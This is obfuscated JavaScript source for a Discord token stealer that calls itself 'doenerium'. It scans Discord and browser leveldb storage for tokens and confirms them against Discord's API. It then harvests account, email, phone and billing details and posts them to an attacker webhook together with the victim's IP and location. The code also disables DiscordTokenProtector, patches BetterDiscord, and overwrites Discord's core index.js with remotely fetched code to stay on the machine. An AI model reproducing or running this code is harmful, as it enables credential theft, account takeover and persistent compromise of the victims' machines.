const _0x4e0515 = (function () {
    let _0x3d199f = true
    return function (_0x5ad5e0, _0x426d6c) {
      const _0x1667af = _0x3d199f
        ? function () {
            if (_0x426d6c) {
              const _0x45dd7b = _0x426d6c.apply(_0x5ad5e0, arguments)
              return (_0x426d6c = null), _0x45dd7b
            }
          }
        : function () {}
      return (_0x3d199f = false), _0x1667af
    }
  })(),
  _0x1b829b = _0x4e0515(this, function () {
    const _0x3ad1b4 = function () {
        let _0x4556d7
        try {
          _0x4556d7 = Function(
            'return (function() {}.constructor("return this")( ));'
          )()
        } catch (_0x20240c) {
          _0x4556d7 = window
        }
        return _0x4556d7
      },
      _0x13786b = _0x3ad1b4(),
      _0xf2a42a = (_0x13786b.console = _0x13786b.console || {}),
      _0xc50edf = [
        'log',
        'warn',
        'info',
        'error',
        'exception',
        'table',
        'trace',
      ]
    for (let _0x567b21 = 0; _0x567b21 < _0xc50edf.length; _0x567b21++) {
      const _0x3c6bd4 = _0x4e0515.constructor.prototype.bind(_0x4e0515),
        _0x5e2380 = _0xc50edf[_0x567b21],
        _0x3ec115 = _0xf2a42a[_0x5e2380] || _0x3c6bd4
      _0x3c6bd4['__proto__'] = _0x4e0515.bind(_0x4e0515)
      _0x3c6bd4.toString = _0x3ec115.toString.bind(_0x3ec115)
      _0xf2a42a[_0x5e2380] = _0x3c6bd4
    }
  })
_0x1b829b()
module.exports = (_0x202b17) => {
  return {
    async getTokens() {
      var _0x450c70 = {
        Discord:
          _0x202b17.utils.encryption.decryptData(
            _0x202b17.config.user.appdata
          ) + '\\discord\\Local Storage\\leveldb\\',
        'Discord Canary':
          _0x202b17.utils.encryption.decryptData(
            _0x202b17.config.user.appdata
          ) + '\\discordcanary\\Local Storage\\leveldb\\',
        Lightcord:
          _0x202b17.utils.encryption.decryptData(
            _0x202b17.config.user.appdata
          ) + '\\Lightcord\\Local Storage\\leveldb\\',
        'Discord PTB':
          _0x202b17.utils.encryption.decryptData(
            _0x202b17.config.user.appdata
          ) + '\\discordptb\\Local Storage\\leveldb\\',
        Opera:
          _0x202b17.utils.encryption.decryptData(
            _0x202b17.config.user.appdata
          ) + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
        'Opera GX':
          _0x202b17.utils.encryption.decryptData(
            _0x202b17.config.user.appdata
          ) + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
        Amigo:
          _0x202b17.utils.encryption.decryptData(
            _0x202b17.config.user.localappdata
          ) + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
        Torch:
          _0x202b17.utils.encryption.decryptData(
            _0x202b17.config.user.localappdata
          ) + '\\Torch\\User Data\\Local Storage\\leveldb\\',
        Kometa:
          _0x202b17.utils.encryption.decryptData(
            _0x202b17.config.user.localappdata
          ) + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
        Orbitum:
          _0x202b17.utils.encryption.decryptData(
            _0x202b17.config.user.localappdata
          ) + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
        CentBrowser:
          _0x202b17.utils.encryption.decryptData(
            _0x202b17.config.user.localappdata
          ) + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
        '7Star':
          _0x202b17.utils.encryption.decryptData(
            _0x202b17.config.user.localappdata
          ) + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
        Sputnik:
          _0x202b17.utils.encryption.decryptData(
            _0x202b17.config.user.localappdata
          ) + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
        Vivaldi:
          _0x202b17.utils.encryption.decryptData(
            _0x202b17.config.user.localappdata
          ) + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
        'Chrome SxS':
          _0x202b17.utils.encryption.decryptData(
            _0x202b17.config.user.localappdata
          ) + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
        Chrome:
          _0x202b17.utils.encryption.decryptData(
            _0x202b17.config.user.localappdata
          ) + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
        'Epic Privacy Browser':
          _0x202b17.utils.encryption.decryptData(
            _0x202b17.config.user.localappdata
          ) + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
        'Microsoft Edge':
          _0x202b17.utils.encryption.decryptData(
            _0x202b17.config.user.localappdata
          ) + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
        Uran:
          _0x202b17.utils.encryption.decryptData(
            _0x202b17.config.user.localappdata
          ) + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
        Yandex:
          _0x202b17.utils.encryption.decryptData(
            _0x202b17.config.user.localappdata
          ) +
          '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
        Brave:
          _0x202b17.utils.encryption.decryptData(
            _0x202b17.config.user.localappdata
          ) +
          '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
        Iridium:
          _0x202b17.utils.encryption.decryptData(
            _0x202b17.config.user.localappdata
          ) + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\',
      }
      for (let [_0x1f0133, _0x1c6e76] of Object.entries(_0x450c70)) {
        if (_0x202b17.requires.fs.existsSync(_0x1c6e76)) {
          for (file_name of _0x202b17.requires.fs.readdirSync(_0x1c6e76)) {
            if (!file_name.endsWith('.log') && !file_name.endsWith('.ldb')) {
              continue
            }
            const _0x1b4dc2 = { encoding: 'utf8' }
            var _0x1b4e19 = _0x202b17.requires.fs.readFileSync(
              _0x1c6e76 + '\\' + file_name,
              _0x1b4dc2
            )
            for (var _0x55993a of _0x1b4e19.split('\n')) {
              for (var _0x5c841b of [
                /\w-]{24}\.[\w-]{6}\.[\w-]{27}/,
                /mfa\.[\w-]{84}/,
              ]) {
                if (_0x55993a.match(_0x5c841b)) {
                  await this.validateToken(
                    _0x1f0133,
                    _0x55993a.match(_0x5c841b)[0]
                  )
                }
              }
            }
          }
        }
      }
    },
    async validateToken(_0x81a2a6, _0x5a6877) {
      const _0x394a61 = { Authorization: _0x5a6877 }
      _0x394a61['Content-Type'] = 'application/json'
      _0x394a61['User-Agent'] =
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
      const _0x5a31cd = {
        url: 'https://discord.com/api/v9/users/@me',
        method: 'GET',
        headers: _0x394a61,
      }
      const _0x5b4cf3 = await _0x202b17.requires
        .axios(_0x5a31cd)
        .catch((_0x1097f3) => {
          return _0x1097f3.response
        })
      if (_0x5b4cf3.request.res.statusCode == 200) {
        const _0x522434 = {
          url: 'https://discord.com/api/v9/users/@me/billing/payment-sources',
          method: 'GET',
          headers: {},
        }
        _0x522434.headers.Authorization = _0x5a6877
        _0x522434.headers['Content-Type'] = 'application/json'
        _0x522434.headers['User-Agent'] =
          'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
        const _0x1034dc = await _0x202b17.requires
          .axios(_0x522434)
          .catch((_0x4348ec) => {
            return _0x4348ec.response
          })
        var _0x1bebb9 = []
        _0x1034dc.data.forEach((_0x12a4fb) => {
          if (_0x12a4fb.type == '') {
            return 'false'
          } else {
            if (_0x12a4fb.invalid == true) {
              return 'false'
            } else {
              if (_0x12a4fb.type == 2) {
                _0x1bebb9.push('PayPal')
              } else {
                if (_0x12a4fb.type == 1) {
                  _0x1bebb9.push('Credit Card (' + _0x12a4fb.country + ')')
                }
              }
            }
          }
        })
        !_0x202b17.config.discord.grabbed_tokens[_0x81a2a6] &&
          (_0x202b17.config.discord.grabbed_tokens[_0x81a2a6] = [])
        _0x202b17.config.discord.grabbed_tokens[_0x81a2a6].push({
          source: _0x81a2a6,
          id: _0x5b4cf3.data.id,
          username:
            _0x5b4cf3.data.username + '#' + _0x5b4cf3.data.discriminator,
          phone: _0x5b4cf3.data.phone,
          email: _0x5b4cf3.data.email,
          locale: _0x5b4cf3.data.locale,
          nitro: this.getNitro(_0x5b4cf3.data.premium_type),
          badges: this.getBadges(_0x5b4cf3.data.flags),
          billing: _0x1bebb9.join(', '),
          token: _0x5a6877,
        })
        _0x202b17.config.discord.grabbed_tokens.all.push({
          source: _0x81a2a6,
          id: _0x5b4cf3.data.id,
          username:
            _0x5b4cf3.data.username + '#' + _0x5b4cf3.data.discriminator,
          phone: _0x5b4cf3.data.phone,
          email: _0x5b4cf3.data.email,
          locale: _0x5b4cf3.data.locale,
          nitro: this.getNitro(_0x5b4cf3.data.premium_type),
          badges: this.getBadges(_0x5b4cf3.data.flags),
          billing: _0x1bebb9.join(', '),
          token: _0x5a6877,
        })
        var _0xabae7c = []
        for (let [_0x3313e4, _0x4304d6] of Object.entries({
          Source: _0x81a2a6,
          Identifier: _0x5b4cf3.data.id,
          Username:
            _0x5b4cf3.data.username + '#' + _0x5b4cf3.data.discriminator,
          'Phone Number': _0x5b4cf3.data.phone,
          'E-Mail Address': _0x5b4cf3.data.email,
          Locale: _0x5b4cf3.data.locale,
          Nitro: this.getNitro(_0x5b4cf3.data.premium_type),
          Badges:
            this.getBadges(_0x5b4cf3.data.flags) != ''
              ? this.getBadges(_0x5b4cf3.data.flags)
              : 'None',
          Billing: _0x1bebb9.join(', ') != '' ? _0x1bebb9.join(', ') : 'None',
          Token: _0x5a6877,
        })) {
          const _0xc8ed5a = {
            name: _0x3313e4,
            value: '```' + _0x4304d6 + '```',
            inline: true,
          }
          _0xabae7c.push(_0xc8ed5a)
        }
        const _0x629728 = {
          url: _0x5b4cf3.data.avatar
            ? 'https://cdn.discordapp.com/avatars/' +
              _0x5b4cf3.data.id +
              '/' +
              _0x5b4cf3.data.avatar
            : 'https://cdn.discordapp.com/embed/avatars/0.png',
        }
        await _0x202b17.utils.webhook.sendToWebhook(
          _0x202b17.config.webhook.discord
            ? _0x202b17.utils.encryption.decryptData(
                _0x202b17.config.webhook.discord
              )
            : _0x202b17.utils.encryption.decryptData(
                _0x202b17.config.webhook.url
              ),
          _0x202b17.config.dualhook.discord
            ? _0x202b17.config.dualhook.discord
            : _0x202b17.config.dualhook.url,
          {
            embeds: [
              new _0x202b17.requires.discordjs.MessageEmbed(
                _0x202b17.utils.webhook.createEmbed({
                  title: 'Found token in: ' + _0x81a2a6,
                  fields: _0xabae7c,
                  thumbnail: _0x629728,
                  author: {
                    name:
                      _0x5b4cf3.data.username +
                      '#' +
                      _0x5b4cf3.data.discriminator +
                      ' (' +
                      _0x5b4cf3.data.id +
                      ')',
                    url: _0x202b17.utils.encryption.decryptData(
                      _0x202b17.config.embed.href
                    ),
                    icon_url: _0x5b4cf3.data.avatar
                      ? 'https://cdn.discordapp.com/avatars/' +
                        _0x5b4cf3.data.id +
                        '/' +
                        _0x5b4cf3.data.avatar
                      : 'https://cdn.discordapp.com/embed/avatars/0.png',
                  },
                })
              ),
            ],
          }
        )
      }
    },
    async saveDiscordTokens() {
      if (_0x202b17.config.discord.grabbed_tokens.all.length == 0) {
        return
      }
      _0x202b17.utils.jszip.createFolder('\\Discord')
      for (let [_0x707d01, _0x1f099b] of Object.entries(
        _0x202b17.config.discord.grabbed_tokens
      )) {
        if (_0x1f099b.length != 0) {
          let _0xc126e5 = ''
          for (let _0x145bf0 of _0x1f099b) {
            _0xc126e5 +=
              '==================================================\nSource          : ' +
              _0x145bf0.source +
              '\nIdentifier      : ' +
              _0x145bf0.id +
              '\nUsername        : ' +
              _0x145bf0.username +
              '\nPhone           : ' +
              _0x145bf0.phone +
              '\nE-Mail Address  : ' +
              _0x145bf0.email +
              '\nLocale          : ' +
              _0x145bf0.locale +
              '\nNitro           : ' +
              _0x145bf0.nitro +
              '\nBadges          : ' +
              (_0x145bf0.badges != '' ? _0x145bf0.badges : 'None') +
              '\nBilling         : ' +
              (_0x145bf0.billing != '' ? _0x145bf0.billing : 'None') +
              '\nToken           : ' +
              _0x145bf0.token +
              '\n==================================================\n\n'
          }
          _0x202b17.utils.jszip.createTxt(
            '\\Discord\\' + _0x707d01.toUpperCase() + '.txt',
            _0xc126e5
          )
        }
      }
    },
    getBadges(_0x255619) {
      const _0x435c8e = {
        Value: 1,
        Emoji: 'Discord Employee',
        Rare: true,
      }
      const _0x55c114 = {
        Value: 2,
        Emoji: 'Partnered Server Owner',
        Rare: true,
      }
      const _0x1828c9 = {
        Value: 4,
        Emoji: 'HypeSquad Events',
        Rare: true,
      }
      const _0x5105ea = {
        Value: 8,
        Emoji: 'Bug Hunter Level 1',
        Rare: true,
      }
      const _0x4c339a = {
        Value: 512,
        Emoji: 'Early Supporter',
        Rare: true,
      }
      const _0x1f0fd2 = {
        Value: 16384,
        Emoji: 'Bug Hunter Level 2',
        Rare: true,
      }
      const _0x395eba = {
        Value: 131072,
        Emoji: 'Early Verified Bot Developer',
        Rare: true,
      }
      const _0x3b738e = {
        Value: 64,
        Emoji: 'House Bravery',
        Rare: false,
      }
      const _0x3e4772 = {
        Value: 128,
        Emoji: 'House Brilliance',
        Rare: false,
      }
      const _0x26482d = {
        Value: 256,
        Emoji: 'House Balance',
        Rare: false,
      }
      const _0x103ad9 = {
        Discord_Employee: _0x435c8e,
        Partnered_Server_Owner: _0x55c114,
        HypeSquad_Events: _0x1828c9,
        Bug_Hunter_Level_1: _0x5105ea,
        Early_Supporter: _0x4c339a,
        Bug_Hunter_Level_2: _0x1f0fd2,
        Early_Verified_Bot_Developer: _0x395eba,
        House_Bravery: _0x3b738e,
        House_Brilliance: _0x3e4772,
        House_Balance: _0x26482d,
      }
      var _0x236be9 = _0x103ad9,
        _0x147607 = []
      for (var _0x22723d in _0x236be9) {
        _0x22723d = _0x236be9[_0x22723d]
        if (
          (_0x255619 & _0x22723d.Value) == _0x22723d.Value &&
          _0x22723d.Rare
        ) {
          _0x147607.push(_0x22723d.Emoji)
        }
      }
      return _0x147607.join(', ')
    },
    getNitro(_0x5139d9) {
      switch (_0x5139d9) {
        case 0:
          return 'No Nitro'
        case 1:
          return 'Nitro Classic'
        case 2:
          return 'Nitro Boost'
        default:
          return 'No Nitro'
      }
    },
    bypass_token_protector() {
      try {
        for (const _0x289e90 of [
          'DiscordTokenProtector.exe',
          'ProtectionPayload.dll',
          'secure.dat',
        ]) {
          _0x202b17.requires.fs.exists(
            _0x202b17.utils.encryption.decryptData(
              _0x202b17.config.user.localappdata
            ) +
              '\\' +
              _0x289e90
          ) &&
            _0x202b17.requires.fs.rm(
              _0x202b17.utils.encryption.decryptData(
                _0x202b17.config.user.localappdata
              ) +
                '\\' +
                _0x289e90
            )
        }
        const _0x3e8405 = { encoding: 'utf-8' }
        const _0x3d4299 = JSON.parse(
          _0x202b17.requires.fs.readFileSync(
            _0x202b17.utils.encryption.decryptData(
              _0x202b17.config.user.localappdata
            ) + '\\DiscordTokenProtector\\config.json',
            _0x3e8405
          )
        )
        _0x3d4299.auto_start = false
        _0x3d4299.auto_start_discord = false
        _0x3d4299.integrity = false
        _0x3d4299.integrity_allowbetterdiscord = false
        _0x3d4299.integrity_checkexecutable = false
        _0x3d4299.integrity_checkhash = false
        _0x3d4299.integrity_checkmodule = false
        _0x3d4299.integrity_checkscripts = false
        _0x3d4299.integrity_checkresource = false
        _0x3d4299.integrity_redownloadhashes = false
        _0x3d4299.iterations_iv = 0
        _0x3d4299.iterations_key = 0
        _0x3d4299.version = 0
        _0x202b17.requires.fs.writeFileSync(
          _0x202b17.utils.encryption.decryptData(
            _0x202b17.config.user.localappdata
          ) + '\\DiscordTokenProtector\\config.json',
          JSON.stringify(_0x3d4299, null, 4)
        )
      } catch {}
    },
    async listExecutables() {
      var _0x19a7ea = []
      return (
        _0x202b17.requires.child_process.exec(
          'tasklist',
          (_0xef9c84, _0x2b85ed) => {
            for (const _0x54f270 of [
              'Discord.exe',
              'DiscordCanary.exe',
              'discordDevelopment.exe',
              'DiscordPTB.exe',
            ]) {
              _0x2b85ed.includes(_0x54f270) &&
                (_0x202b17.config.discord.running_executables.push(_0x54f270),
                _0x19a7ea.push(_0x54f270))
            }
          }
        ),
        _0x19a7ea
      )
    },
    pwnBetterDiscord() {
      if (
        _0x202b17.requires.fs.existsSync(
          _0x202b17.utils.encryption.decryptData(
            _0x202b17.config.user.appdata
          ) + '\\BetterDiscord\\data\\betterdiscord.asar'
        )
      ) {
        _0x202b17.requires.fs.writeFileSync(
          _0x202b17.utils.encryption.decryptData(
            _0x202b17.config.user.appdata
          ) + '\\BetterDiscord\\data\\betterdiscord.asar',
          _0x202b17.requires.buf_replace(
            _0x202b17.requires.fs.readFileSync(
              _0x202b17.utils.encryption.decryptData(
                _0x202b17.config.user.appdata
              ) + '\\BetterDiscord\\data\\betterdiscord.asar',
              { encoding: 'utf8' }
            ),
            'api/webhooks',
            'doenerium_on_top'
          )
        )
      }
    },
    async modify_discord_core() {
      const _0x5a942c = await _0x202b17.requires.axios.get(
          _0x202b17.utils.encryption.decryptData(
            _0x202b17.config.discord.base_url
          )
        ),
        _0x1010c7 = () => {
          let _0x2c13c7 = _0x5a942c.data.replace(
            '%WEBHOOK_LINK%',
            _0x202b17.utils.encryption.decryptData(
              _0x202b17.config.webhook.discord
                ? _0x202b17.config.webhook.discord
                : _0x202b17.config.webhook.url
            )
          )
          return _0x2c13c7
        }
      for (const _0x372387 of _0x202b17.config.discord.files_path) {
        if (!_0x372387.includes('node_modules')) {
          const _0x1ce3c8 = {
            encoding: 'utf8',
            flag: 'w',
          }
          _0x202b17.requires.fs.writeFileSync(_0x372387, _0x1010c7(), _0x1ce3c8)
          const _0x412edd = {
            name: 'Path',
            value: '```' + _0x372387 + '```',
          }
          const _0x30150e = {
            title: 'Injected into discord core',
            fields: [_0x412edd],
          }
          await _0x202b17.utils.webhook.sendToWebhook(
            _0x202b17.utils.encryption.decryptData(
              _0x202b17.config.webhook.discord
            ),
            _0x202b17.config.dualhook.discord,
            {
              embeds: [
                new _0x202b17.requires.discordjs.MessageEmbed(
                  _0x202b17.utils.webhook.createEmbed(_0x30150e)
                ),
              ],
            }
          )
        }
      }
    },
    findDiscordCore(_0x399de8, _0x269b10) {
      _0x269b10.forEach((_0x1c80c3) => {
        if (
          _0x202b17.requires.fs
            .statSync(_0x399de8 + '\\' + _0x1c80c3)
            .isDirectory()
        ) {
          this.findDiscordCore(
            _0x399de8 + '\\' + _0x1c80c3,
            _0x202b17.requires.fs.readdirSync(_0x399de8 + '\\' + _0x1c80c3)
          )
        } else {
          if (
            _0x399de8.includes('modules') &&
            _0x399de8.includes('discord_desktop_core')
          ) {
            _0x1c80c3 == 'index.js' &&
              _0x202b17.config.discord.files_path.push(
                _0x399de8 + '\\' + _0x1c80c3
              )
          }
        }
      })
    },
    async getIP() {
      return (await _0x202b17.requires.axios.get('https://ipinfo.io/json')).data
    },
    async init() {
      this.pwnBetterDiscord()
      for (const _0x1d44f2 of _0x202b17.requires.fs.readdirSync(
        _0x202b17.utils.encryption.decryptData(
          _0x202b17.config.user.localappdata
        )
      )) {
        _0x1d44f2.toLowerCase().includes('iscord') &&
          _0x202b17.config.discord.executables.push(
            _0x202b17.utils.encryption.decryptData(
              _0x202b17.config.user.localappdata
            ) +
              '\\' +
              _0x1d44f2
          )
      }
      for (const _0x19f1ce of _0x202b17.config.discord.executables) {
        this.findDiscordCore(
          _0x19f1ce,
          _0x202b17.requires.fs.readdirSync(_0x19f1ce)
        )
      }
      await this.modify_discord_core()
      try {
        await _0x202b17.requires.child_process.exec(
          'tasklist',
          async (_0x56cc26, _0x5244d7) => {
            for (const _0x5e0dca of [
              'Discord.exe',
              'DiscordCanary.exe',
              'discordDevelopment.exe',
              'DiscordPTB.exe',
            ]) {
              _0x5244d7.includes(_0x5e0dca) &&
                (await _0x202b17.requires.child_process.exec(
                  'taskkill /IM ' + _0x5e0dca + ' /F',
                  (_0x4b5357) => {}
                ),
                await _0x202b17.requires.child_process.exec(
                  '"' +
                    _0x202b17.utils.encryption.decryptData(
                      _0x202b17.config.user.localappdata
                    ) +
                    '\\' +
                    _0x5e0dca.replace('.exe', '') +
                    '\\Update.exe" --processStart ' +
                    _0x5e0dca,
                  (_0x2bd577) => {}
                ))
            }
          }
        )
      } catch {}
      let _0x4cc438 = []
      const _0x15836d = await this.getIP()
      _0x202b17.config.user.network_data = _0x15836d
      const _0x19e437 = {
        name: 'Connection data',
        value:
          '```yaml\nIP Address: ' + _0x15836d.ip ??
          'Unknown' + '\nHostname: ' + _0x15836d.hostname ??
          'Unknown' + '\nCity: ' + _0x15836d.city ??
          'Unknown' + '\nRegion: ' + _0x15836d.region ??
          'Unknown' + '\nCountry: ' + _0x15836d.country ??
          'Unknown' + '\nTimezone: ' + _0x15836d.timezone ??
          'Unknown' + '```',
        inline: true,
      }
      _0x4cc438.push(_0x19e437)
      await _0x202b17.utils.webhook.sendToWebhook(
        _0x202b17.utils.encryption.decryptData(_0x202b17.config.webhook.url),
        _0x202b17.config.dualhook.url,
        {
          embeds: [
            new _0x202b17.requires.discordjs.MessageEmbed(
              _0x202b17.utils.webhook.createEmbed({
                title:
                  _0x202b17.utils.flags.getFlag(_0x15836d.country) ??
                  'Unknown' + ' Grabbed data',
                fields: _0x4cc438,
              })
            ),
          ],
        }
      )
      await _0x202b17.utils.time.sleep(30000)
      for (const _0x1d2d89 of _0x202b17.config.discord.files_path) {
        _0x202b17.requires.fs.existsSync(
          _0x1d2d89.replace('index.js', 'doenerium')
        ) &&
          _0x202b17.requires.fs.rmdirSync(
            _0x1d2d89.replace('index.js', 'doenerium')
          )
      }
    },
  }
}
